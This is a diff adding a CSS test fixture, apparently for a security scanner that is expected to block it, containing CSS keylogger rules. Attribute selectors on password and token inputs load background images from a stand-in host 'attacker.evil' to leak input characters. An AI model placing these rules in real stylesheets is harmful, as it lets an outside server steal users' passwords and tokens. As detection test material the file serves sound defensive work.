@@ -1,0 +1,19 @@
+/*
+ * Malicious Test CSS: CSS Keylogger & Data Exfiltration
+ * Attack Vector: Uses attribute selectors to brute force passwords/inputs and exfiltrate
+ *                characters via external HTTP requests
+ * Expected Result: BLOCKED (High Severity: exfiltration-keylogger-selector)
+ */
+
+/* CSS Keylogger rules sniffing input values */
+input[type="password"][value^="a"] {
+  background: url("https://attacker.evil/leak?char=a");
+}
+
+input[type="password"][value^="b"] {
+  background: url("https://attacker.evil/leak?char=b");
+}
+
+input[name="token"][value^="secret_"] {
+  background-image: url("https://attacker.evil/steal_token?val=secret");
+}
